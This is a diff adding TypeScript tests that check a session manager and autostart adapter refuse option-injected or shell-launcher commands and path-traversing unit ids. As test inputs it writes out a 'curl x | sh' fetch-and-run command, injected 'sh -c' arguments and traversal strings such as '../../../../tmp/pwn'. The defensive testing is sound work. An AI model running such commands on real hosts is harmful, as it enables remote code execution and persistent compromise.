@@ -340,6 +340,67 @@ describe.each(CASES)('%s', (_name, makeFixture) => {
     });
   });
 
+  /**
+   * The two criticals from the security review on PR #72, asserted against BOTH implementations.
+   *
+   * They are here rather than in the Darwin tests because the core suite runs against the double
+   * (CLAUDE.md §4, Seam B): a rule the double does not enforce is a rule a core caller can violate
+   * in CI and only discover on the real host. The substrate-specific halves -- tmux's `--` and the
+   * LaunchAgents path -- stay in the Darwin tests, where they belong.
+   */
+  describe('a caller-supplied command cannot reconfigure the session backend', () => {
+    const attach = (fixture: Fixture, command: readonly string[] | null) =>
+      fixture.adapter.session_manager().attach({
+        session_id: 'attempt-1',
+        working_directory: fixture.inside,
+        command,
+      });
+
+    it('refuses a command beginning with an option the backend would read as its own', async () => {
+      const f = makeFixture();
+      const attachment = await attach(f, ['-c', '/etc', 'sh']);
+      expect(attachment.outcome).toBe('refused');
+      expect(attachment.refused_reason).toMatch(/may not begin with an option/);
+    });
+
+    it('refuses a launcher, whose whole job is to run something the check never saw', async () => {
+      const f = makeFixture();
+      const attachment = await attach(f, ['sh', '-c', 'echo anything']);
+      expect(attachment.outcome).toBe('refused');
+      expect(attachment.refused_reason).toMatch(/exists to run another program/);
+    });
+
+    it('refuses before deciding whether the session already exists', async () => {
+      // An invalid spec is invalid either way: a reattach that quietly succeeds on a command the
+      // create path would refuse teaches a caller the command was acceptable.
+      const f = makeFixture();
+      expect((await attach(f, null)).outcome).toBe('created');
+      const second = await attach(f, ['sh', '-c', 'echo anything']);
+      expect(second.outcome).toBe('refused');
+    });
+  });
+
+  describe('a unit id is an identifier, never a path', () => {
+    it('refuses to install, status or repair a traversing unit id', async () => {
+      const f = makeFixture();
+      const autostart = f.adapter.autostart_contract();
+      for (const unit_id of ['../../../../tmp/pwn', 'a/b', '.hidden']) {
+        await expect(autostart.install(plan(unit_id, f.root))).rejects.toThrow(/bare identifier/);
+        await expect(autostart.status(unit_id)).rejects.toThrow(/bare identifier/);
+        await expect(autostart.repair(plan(unit_id, f.root))).rejects.toThrow(/bare identifier/);
+      }
+    });
+
+    it('refuses a plan whose program is a launcher, which a reboot would make permanent', async () => {
+      const f = makeFixture();
+      await expect(
+        f.adapter
+          .autostart_contract()
+          .install({ ...plan('ok.unit', f.root), program: ['/bin/sh', '-c', 'curl x | sh'] }),
+      ).rejects.toThrow(/exists to run another program/);
+    });
+  });
+
   describe('§6.4 health probes surface host facts as data', () => {
     it('covers permissions, power, disk and unlock state', async () => {
       const report = await makeFixture().adapter.health_probes();
